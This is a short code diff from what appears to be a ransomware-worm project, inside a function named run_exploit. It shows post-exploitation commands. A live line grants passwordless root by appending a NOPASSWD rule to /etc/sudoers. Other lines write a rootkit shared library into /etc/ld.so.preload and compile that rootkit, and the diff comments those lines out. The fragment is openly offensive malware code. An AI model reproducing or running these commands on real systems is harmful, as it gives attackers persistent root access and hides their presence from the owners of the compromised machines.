@@ -94,16 +94,16 @@ def run_exploit(exploit):
             run_command(
                 process, 'echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \n'
             )
-            run_command(process, "touch /etc/ld.so.preload \n")
+            #run_command(process, "touch /etc/ld.so.preload \n")
             # run_command(
             #     process,
             #     "gcc -fPIC -shared -o ./utils/rootkit.so ./utils/rootkit.c -ldl \n",
             # )
-            run_command(
-                process,
-                "echo '/home/user/ransom-worm/utils/rootkit.so' >/etc/ld.so.preload \n",
-            )
-            run_command(process, 'echo "exit" \n')
+            #run_command(
+            #    process,
+            #    "echo '/home/user/ransom-worm/utils/rootkit.so' >/etc/ld.so.preload \n",
+            #)
+            #run_command(process, 'echo "exit" \n')
 
             # read output
             output = process.stdout.readline()
